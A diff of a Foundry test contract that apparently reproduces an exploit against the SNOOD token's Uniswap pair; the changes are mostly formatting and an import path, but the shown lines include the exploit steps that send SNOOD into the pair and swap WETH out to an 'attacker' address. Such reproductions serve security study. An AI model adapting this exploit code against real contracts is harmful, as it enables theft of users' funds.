@@ -2,20 +2,24 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import {IERC20} from "OpenZeppelin/interfaces/IERC20.sol";
+import {IERC20} from "src/interfaces/IERC20.sol";
 
 interface IUNIPAIR is IERC20 {
-
     function sync() external;
 
-    function getReserves() external returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+    function getReserves()
+        external
+        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
 
-    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
-
+    function swap(
+        uint256 amount0Out,
+        uint256 amount1Out,
+        address to,
+        bytes calldata data
+    ) external;
 }
 
 contract ContractTest is Test {
-
     IERC20 SNOOD = IERC20(0xD45740aB9ec920bEdBD9BAb2E863519E59731941);
     IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
 
@@ -38,13 +42,15 @@ contract ContractTest is Test {
 
         require(SNOOD.transfer(address(uniLP), balance - 1));
 
-        (uint112 a, uint112 b,) = uniLP.getReserves();
+        (uint112 a, uint112 b, ) = uniLP.getReserves();
 
         uint256 amount0Out;
         if (b * 10_000 + (balance - 1) * 9970 == 0) {
             amount0Out = 0;
         } else {
-            amount0Out = ((balance - 1) * 9970 * a) / (b * 10_000 + (balance - 1) * 9970);
+            amount0Out =
+                ((balance - 1) * 9970 * a) /
+                (b * 10_000 + (balance - 1) * 9970);
         }
 
         uniLP.swap(amount0Out, 0, attacker, "");
@@ -54,5 +60,4 @@ contract ContractTest is Test {
 
         assertTrue(WETH.balanceOf(attacker) > 0);
     }
-
 }
